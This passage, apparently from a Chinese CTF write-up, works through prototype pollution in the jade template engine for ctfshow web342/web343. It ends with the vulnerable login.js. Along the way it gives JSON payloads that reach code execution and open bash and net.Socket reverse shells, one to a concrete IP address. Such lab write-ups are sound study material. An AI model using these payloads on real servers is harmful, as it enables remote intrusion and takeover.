+<p>这里因 <code>utils.copy(user.userinfo,req.body);</code> 与 web341一样，<code>userinfo.__proto__.__proto__</code> 才是 <code>Object</code> 对象的原型，所以要套两层。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先打一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116128748-ac570d67-cac5-468c-a273-a43812c73435.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116128748-ac570d67-cac5-468c-a273-a43812c73435.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>第 3 个问题提前出现了，要先解决这个问题，保证代码能够执行到渲染阶段</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116131082-927af231-aa69-4d7f-a1fa-d1bd6eb1d180.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116131082-927af231-aa69-4d7f-a1fa-d1bd6eb1d180.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>和先知文章里不同，这里报错有点不一样，先跟进 <code>Compiler.visitNode</code> 225行看一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116541915-a5c6af43-8a65-453d-9995-a31a66b54457.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116541915-a5c6af43-8a65-453d-9995-a31a66b54457.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>拼接一下，发现没有这个方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116560928-00141f65-8124-4d8b-b9b3-4f70b435b057.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620116560928-00141f65-8124-4d8b-b9b3-4f70b435b057.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>在遍历AST树时，通常是通过 <code>&quot;visit&quot; + 节点类型</code> 来遍历所有节点的，观察错误调用栈也知，比如 <code>visitBlock</code>，就是访问 <code>Block</code> 节点。那 <code>Block</code> 可用，我们就污染一下 <code>type</code> 就好了，当它当前上下文找不到就去找 <code>Object</code> 了。</p>
+<p>当然选取时，最好是选的节点附带的上下文信息进入后，啥事也不会做的，不然也有走向奇奇怪怪的逻辑，先来看看 Block 节点。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117442355-58168bea-2ae8-40a5-a38f-9f38e145a384.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117442355-58168bea-2ae8-40a5-a38f-9f38e145a384.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>这里加上这部分逻辑，来看看我们故意伪造 Block 节点会发生什么</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.type == <span class="literal">undefined</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>[<span class="string">&#x27;visit&#x27;</span> + <span class="string">&#x27;Block&#x27;</span>](node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117969224-9896faed-6f7b-49dd-a4b5-63c9d642847f.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620117969224-9896faed-6f7b-49dd-a4b5-63c9d642847f.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>这里 <code>block.nodes</code> 为 <code>undefined</code> ，然后 <code>undefined.length</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118021804-559e7fb3-5448-494e-a38d-743f1c1e2dcb.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118021804-559e7fb3-5448-494e-a38d-743f1c1e2dcb.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>明显，这样访问会报错，导致进入其他错误，然后 <code>jade</code> 没有对这块异常进行处理。</p>
+<p>也就是说，如果 <code>vist</code> 的节点不是这种 <code>block.子属性.孙子属性</code> 问题应该不大。顶多一个 <code>undefined</code> 然后直接结束啥的，这里试试 <code>visitCode</code> ，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118172963-52ab2681-b97c-4b38-82f3-bf3255b5820d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118172963-52ab2681-b97c-4b38-82f3-bf3255b5820d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>正常走到后面，没有报错，期间只触发了 <code>this.buf.push(code.val)</code> ，问题应该不大。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118198085-93803b1d-f797-4109-89ab-4e61e907c305.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118198085-93803b1d-f797-4109-89ab-4e61e907c305.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>尝试污染 <code>type</code> 为 <code>Code</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118330281-d959454b-3c39-483c-9e4c-f032049d3fed.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118330281-d959454b-3c39-483c-9e4c-f032049d3fed.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>好耶，像是解决了，因为这个报错和先知文章报错一致。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118350820-00c93106-f0ac-4934-8b91-5053218496d9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118350820-00c93106-f0ac-4934-8b91-5053218496d9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>尝试解决这个报错，因为看错误调这里好像还没到渲染成功的地方。</p>
+<p>分析这个错误栈，可以看到前 4 点还是属于 <code>jade</code> 范畴。先跟进 <code>jade</code> 模块最后报错的地方，即 <code>jade/libindex.js</code> 149行的 <code>parse</code> 方法，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118955171-5adf4d74-799a-49da-b808-a290a2b432f0.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620118955171-5adf4d74-799a-49da-b808-a290a2b432f0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>发现，程序已经走完刚刚AST遍历部分了，已经差不多要返回了。</p>
+<p>感觉只要避免进入149行的 <code>addWith</code> 方法，就可以渲染成功了！</p>
+<p>然后进入149行的 <code>addWith</code> 方法是满足147行的 <code>options.self</code> 值为 False，尝试下看看这个 <code>options.self</code> 默认是不是 <code>undefined</code>，如果是就可以污染了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119251617-e365f480-5242-4820-b69e-ce699e0bb915.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119251617-e365f480-5242-4820-b69e-ce699e0bb915.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>nice，就是 <code>undefined</code> ，尝试污染 <code>self</code> 为 <code>true</code> ，<code>1</code> 也可以</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119423983-2f7f92e0-cf5c-4e61-974c-a7b07af0edd4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119423983-2f7f92e0-cf5c-4e61-974c-a7b07af0edd4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119438729-f49f92be-360a-46f7-9d70-e8299187bcaf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620119438729-f49f92be-360a-46f7-9d70-e8299187bcaf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>！！！终于走到渲染这一步了！</p>
+<p>看到 <code>undefined</code> 好说，污染就完事了 （</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;tari&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>到这 index 的页面渲染就没啥问题了，到 第 2 个问题，<code>node.line</code> 在某处为 <code>undefined</code> 才行，不然我们污染的 <code>Object</code> 对象就没意义</p>
+<p>这里如果一步一步动态调试会比较麻烦，直接注入测试即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619878355583-fa6a99d2-3f52-4621-8f22-e9e41af3f303.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619878355583-fa6a99d2-3f52-4621-8f22-e9e41af3f303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"> </p>
+<p>发现都 <code>node</code> 为 <code>Block</code> 的时候 <code>line</code> 是不存在的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619882616884-efc76041-dad6-40e9-b868-f51b2f5347c0.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619882616884-efc76041-dad6-40e9-b868-f51b2f5347c0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>理论上，只要覆盖了 <code>node.line</code> 即可达到代码执行的目的。</p>
+<p>然后拼接上面避免报错的参数，得到</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;title&quot;</span>:<span class="string">&quot;tari&quot;</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/2233&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反弹 Shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134887089-f7c6069a-6fb6-4cd2-b050-9e458e569844.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134887089-f7c6069a-6fb6-4cd2-b050-9e458e569844.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>再 POST一次，发送的数据包不用变</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134804938-2c7f05ad-0f34-478e-89d9-03f6c739b1ec.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620134804938-2c7f05ad-0f34-478e-89d9-03f6c739b1ec.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>不就少了个 <code>message</code>，那我污染你呗，，然后 <code>message</code> 后又说少了 <code>error</code> 继续污染，然后 <code>error</code> 是一个对象，就需要弄个 <code>json</code> 格式数据啦。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135004859-7389888a-d8f0-4621-a7d6-9bf2921c0ebe.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135004859-7389888a-d8f0-4621-a7d6-9bf2921c0ebe.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>emmm，到这，其实一开始就犯了个很蠢的错。。。其实一开始就应该污染 <code>line</code> 先的，然后在试 <code>compileDebug</code>、<code>type</code>、<code>self</code>，蠢哭了，，因为，如果不污染 line 先的话，不能保证在 line 正确的情况下试其他的，就会导致，，其他对了，加上 <code>line</code> 就错了。。</p>
+<p>其实这里，压根就不用污染 <code>title</code>，如果是 先污染 <code>line</code>，然后到 <code>compileDebug</code>、<code>type</code>、<code>self</code> 会发现，到 <code>self</code> 这就可以成功反弹 shell 了，人都傻了。。。</p>
+<p>最终 EXP</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135415450-1fa60022-1025-4b8b-be41-7b50e9b9063d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135415450-1fa60022-1025-4b8b-be41-7b50e9b9063d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>不用变，在POST一次即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135362376-428be533-bf5a-467c-b3b3-7fced3de7f4c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620135362376-428be533-bf5a-467c-b3b3-7fced3de7f4c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>原本想用原生Socket的，不知道为啥老是报错，奇怪，，难道闭合不了？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620141995611-25ddf749-f50f-40f4-ba96-34d74fe24347.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620141995611-25ddf749-f50f-40f4-ba96-34d74fe24347.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web343-原型链污染"><a href="#web343-原型链污染" class="headerlink" title="web343 原型链污染 +++++"></a>web343 原型链污染 +++++</h2><p>说有过滤，但 web342一样的 EXP 也可以打，反弹shell后看源码才发现确实多了点东西</p>
+<p>login.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).json(),<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.userinfo = <span class="keyword">new</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.isVIP = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAdmin = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.isAuthor = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">JSON</span>.stringify(req.body).match(<span class="regexp">/Text/ig</span>))&#123;</span><br><span class="line">    res.end(<span class="string">&#x27;hacker go away&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    utils.copy(user.userinfo,req.body);</span><br><span class="line">    <span class="keyword">if</span>(user.userinfo.isAdmin)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure>
+
+
+
